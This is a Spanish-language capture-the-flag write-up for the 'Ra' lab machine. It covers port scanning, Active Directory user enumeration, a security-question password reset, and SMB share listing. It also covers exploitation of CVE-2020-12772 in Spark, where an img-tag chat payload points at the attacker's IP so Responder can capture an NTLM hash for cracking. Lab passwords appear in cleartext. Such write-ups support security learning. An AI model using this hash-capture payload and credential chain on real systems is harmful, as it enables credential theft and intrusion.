# Ra
## Initial Scan
```
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp    open  http                Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Windcorp.
88/tcp    open  kerberos-sec        Microsoft Windows Kerberos (server time: 2020-09-11 23:55:41Z)
135/tcp   open  msrpc               Microsoft Windows RPC
139/tcp   open  netbios-ssn         Microsoft Windows netbios-ssn
443/tcp   open  ssl/http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|   Negotiate
|_  NTLM
| http-ntlm-info: 
|   Target_Name: WINDCORP
|   NetBIOS_Domain_Name: WINDCORP
|   NetBIOS_Computer_Name: FIRE
|   DNS_Domain_Name: windcorp.thm
|   DNS_Computer_Name: Fire.windcorp.thm
|   DNS_Tree_Name: windcorp.thm
|_  Product_Version: 10.0.17763
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
| ssl-cert: Subject: commonName=Windows Admin Center
| Subject Alternative Name: DNS:WIN-2FAA40QQ70B
| Not valid before: 2020-04-30T14:41:03
|_Not valid after:  2020-06-30T14:41:02
|_ssl-date: 2020-09-11T23:58:42+00:00; -1s from scanner time.
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2179/tcp  open  vmrdp?
3268/tcp  open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server       Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WINDCORP
|   NetBIOS_Domain_Name: WINDCORP
|   NetBIOS_Computer_Name: FIRE
|   DNS_Domain_Name: windcorp.thm
|   DNS_Computer_Name: Fire.windcorp.thm
|   DNS_Tree_Name: windcorp.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2020-09-11T23:58:05+00:00
| ssl-cert: Subject: commonName=Fire.windcorp.thm
| Not valid before: 2020-04-30T06:40:02
|_Not valid after:  2020-10-30T06:40:02
|_ssl-date: 2020-09-11T23:58:42+00:00; -1s from scanner time.
5222/tcp  open  jabber
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     stream_id: 2a21nzh6x4
|     compression_methods: 
| 
|     errors: 
|       invalid-namespace
|       (timeout)
|     unknown: 
| 
|     features: 
| 
|     auth_mechanisms: 
| 
|     capabilities: 
| 
|     xmpp: 
|_      version: 1.0
5223/tcp  open  ssl/hpvirtgrp?
5229/tcp  open  jaxflow?
5262/tcp  open  jabber
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     stream_id: 6nxotleupv
|     compression_methods: 
| 
|     errors: 
|       invalid-namespace
|       (timeout)
|     unknown: 
| 
|     features: 
| 
|     auth_mechanisms: 
| 
|     capabilities: 
| 
|     xmpp: 
|_      version: 1.0
5263/tcp  open  ssl/unknown
5269/tcp  open  xmpp                Wildfire XMPP Client
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     compression_methods: 
| 
|     errors: 
|       (timeout)
|     unknown: 
| 
|     features: 
| 
|     auth_mechanisms: 
| 
|     capabilities: 
| 
|_    xmpp: 
5270/tcp  open  ssl/xmp?
5275/tcp  open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     stream_id: acwkvat3ba
|     compression_methods: 
| 
|     errors: 
|       invalid-namespace
|       (timeout)
|     unknown: 
| 
|     features: 
| 
|     auth_mechanisms: 
| 
|     capabilities: 
| 
|     xmpp: 
|_      version: 1.0
5276/tcp  open  ssl/unknown
7070/tcp  open  http                Jetty 9.4.18.v20190429
|_http-server-header: Jetty(9.4.18.v20190429)
|_http-title: Openfire HTTP Binding Service
7443/tcp  open  ssl/http            Jetty 9.4.18.v20190429
|_http-server-header: Jetty(9.4.18.v20190429)
|_http-title: Openfire HTTP Binding Service
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
7777/tcp  open  socks5              (No authentication; connection failed)
| socks-auth-info: 
|_  No authentication
9090/tcp  open  zeus-admin?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Fri, 11 Sep 2020 23:55:41 GMT
|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 115
|     <html>
|     <head><title></title>
|     <meta http-equiv="refresh" content="0;URL=index.jsp">
|     </head>
|     <body>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Fri, 11 Sep 2020 23:55:47 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   JavaRMI, drda, ibm-db2-das, informix: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   SqueezeCenter_CLI: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   WMSRequest: 
|     HTTP/1.1 400 Illegal character CNTL=0x1
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x1</pre>
9091/tcp  open  ssl/xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Fri, 11 Sep 2020 23:55:59 GMT
|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 115
|     <html>
|     <head><title></title>
|     <meta http-equiv="refresh" content="0;URL=index.jsp">
|     </head>
|     <body>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Fri, 11 Sep 2020 23:55:59 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   Help: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 400 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Unknown Version</pre>
|   SSLSessionReq: 
|     HTTP/1.1 400 Illegal character CNTL=0x16
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 70
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
9389/tcp  open  mc-nmf              .NET Message Framing
49667/tcp open  msrpc               Microsoft Windows RPC
49671/tcp open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
49672/tcp open  msrpc               Microsoft Windows RPC
49673/tcp open  msrpc               Microsoft Windows RPC
49693/tcp open  msrpc               Microsoft Windows RPC

```
## First Enum
### DNS
```
|   DNS_Domain_Name: windcorp.thm
|   DNS_Computer_Name: Fire.windcorp.thm
|   DNS_Tree_Name: windcorp.thm
```
Veamos querys
```
~$ dig ANY windcorp.thm @10.10.78.76
windcorp.thm.		3600	IN	SOA	fire.windcorp.thm. hostmaster.windcorp.thm. 181 900 600 86400 3600
```
Añadamos los 3 a nuestro /etc/hosts
### Enum4Linux
```
Domain Name: WINDCORP
Domain Sid: S-1-5-21-555431066-3599073733-176599750
```
### Kebrute 
Este escaneo con kebrute aparte de para encontrar algún usuario tambien nos vale para verificar que tenemos un DC en la máquina objetivo y que el domain es windcorp.thm
```
kebrute userenum --dc windcorp.thm -d windcorp.thm User.txt
2020/09/12 02:33:55 >  [+] VALID USERNAME:	 administrator@windcorp.thm
2020/09/12 02:37:38 >  [+] VALID USERNAME:	 edward@windcorp.thm
2020/09/12 02:38:21 >  [+] VALID USERNAME:	 fire@windcorp.thm
2020/09/12 02:42:08 >  [+] VALID USERNAME:	 luis@windcorp.thm

```
### HTTPS 
Nos pide un user:pass valido para acceder aunque de la respuesta que da a nmap podemos ver que es un admin center
### Openfire
Los puertos 7070, 7443 y 9090 tienen servicios de Openfire funcionando , la version exacta es la 4.5.1
### HTTP 
Vemos que en el servicio HTTP tenemos una utilidad de password reset mediante pregunta de seguridad y los perfiles de la plantilla, con un poco de suerte puede que podamos resetear una pass y tener acceso al servicio https, SMB o al openfire, lo normal seria buscar a los usuarios en RRSS en busca del cumple de su madre, su amorio de insituto o el nombre de su mascota pero resulta que el que hizo la página web puso el nombre de la mascota de la señora Levesque en el nombre de la foto, lo cual facilita enormemente este trabajo
```
windcorp.thm/img/lilyleAndSparky.jpg
```
Sparky es el nombre de la mascota y lilyle el usuario de lilia, podemos deducir tambien que
```
Emilieje
kirkug
```
Son ambos usuarios validos, ahora volviendo a Lily respondemos la pregunta y obtenemos lo siguiente:
```
Your password has been reset to: ChangeMe#1234
```

## Second Enum (LilyLe creds)
### SMB
```
smbclient -U lilyle \\windcorp.thm
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Shared          Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk    
```
Listemos Shared y Users a ver si hay algo util
```
smbclient -U lilyle \\\\windcorp.thm\\Shared 
Enter WORKGROUP\lilyle's password: 
smb: \> ls
  Flag 1.txt                          A       45  Fri May  1 17:32:36 2020
  spark_2_8_3.deb                     A 29526628  Sat May 30 02:45:01 2020
  spark_2_8_3.dmg                     A 99555201  Sun May  3 13:06:58 2020
  spark_2_8_3.exe                     A 78765568  Sun May  3 13:05:56 2020
  spark_2_8_3.tar.gz                  A 123216290  Sun May  3 13:07:24 2020
  
smbclient -U lilyle \\\\windcorp.thm\\Users
Enter WORKGROUP\lilyle's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  Administrator                       D        0  Sun May 10 13:18:11 2020
  All Users                         DHS        0  Sat Sep 15 09:28:48 2018
  angrybird                           D        0  Fri May  1 14:59:20 2020
  berg                                D        0  Fri May  1 14:59:20 2020
  bluefrog579                         D        0  Fri May  1 14:59:20 2020
  brittanycr                          D        0  Sun May  3 01:36:46 2020
  brownostrich284                     D        0  Fri May  1 14:59:20 2020
  buse                                D        0  Sat Sep 12 01:53:38 2020
  Default                           DHR        0  Fri May  1 01:35:11 2020
  Default User                      DHS        0  Sat Sep 15 09:28:48 2018
  desktop.ini                       AHS      174  Sat Sep 15 09:16:48 2018
  edward                              D        0  Fri May  1 14:59:20 2020
  freddy                              D        0  Sun May  3 01:30:16 2020
  garys                               D        0  Fri May  1 14:59:20 2020
  goldencat416                        D        0  Sat Sep 12 03:11:05 2020
  goldenwol                           D        0  Fri May  1 14:59:20 2020
  happ                                D        0  Fri May  1 14:59:20 2020
  happyme                             D        0  Fri May  1 14:59:20 2020
  Luis                                D        0  Fri May  1 14:59:20 2020
  orga                                D        0  Fri May  1 14:59:20 2020
  organicf                            D        0  Fri May  1 14:59:20 2020
  organicfish718                      D        0  Sat Sep 12 03:11:59 2020
  pete                                D        0  Fri May  1 14:59:20 2020
  Public                             DR        0  Thu Apr 30 16:35:47 2020
  purplecat                           D        0  Fri May  1 14:59:20 2020
  purplepanda                         D        0  Fri May  1 14:59:20 2020
  sadswan                             D        0  Fri May  1 14:59:20 2020
  sadswan869                          D        0  Sat Sep 12 03:11:23 2020
  sheela                              D        0  Fri May  1 14:59:20 2020
  silver                              D        0  Fri May  1 14:59:20 2020
  smallf                              D        0  Fri May  1 14:59:20 2020
  spiff                               D        0  Fri May  1 14:59:20 2020
  tinygoos                            D        0  Fri May  1 14:59:20 2020
  whiteleopard                        D        0  Fri May  1 14:59:20 2020
```

Muchos usuarios en la máquina que comprobar y binarios del servicio spark en la version 2.8.3, esta version tiene un cve , el CVE-2020-12772 sera mejor tenerlo en cuenta

## Exploit
### CVE-2020-12772
Primero instalamos el bianrio de spark que hay en el SMB de la máquina objetivo en nuestra máquina para ejcutar el ataque, usaremos las credenciales de lilyle y el dominio windcorp.thm para entrar en el servicio de chat
Aqui tenemos lo necesario para llevar a cabo el ataque
```
https://github.com/theart42/cves/blob/master/cve-2020-12772/CVE-2020-12772.md
```
Para llevar a cabo el ataque necesitamos un usuario al que mandar un mensaje en la máquina objetivo, podemos enumerar los usuarios de la máquina objetivo desde el servicio HTTP donde hay una lista de correos de usuarios, buse esta en verde lo cual parece indicar que esta conectado, sacamos su user de el link al mismo y le mandamos un mensaje to vacilón
```
Sudo give me your hash <img src="http://IP/image.jpg">
```
Pero no sin antes abrir el Responder, una vez abierto nos deberia llegar el hash a nuestro responder, lo crackeamos con JTR

```
uzunLM+3131      (buse)
```
Con esas creds podemos acceder al servicio de administracion del puerto 443

## Privesc
Con las cred + evilwinRM podemos acceder al sistema y leer la flag 2

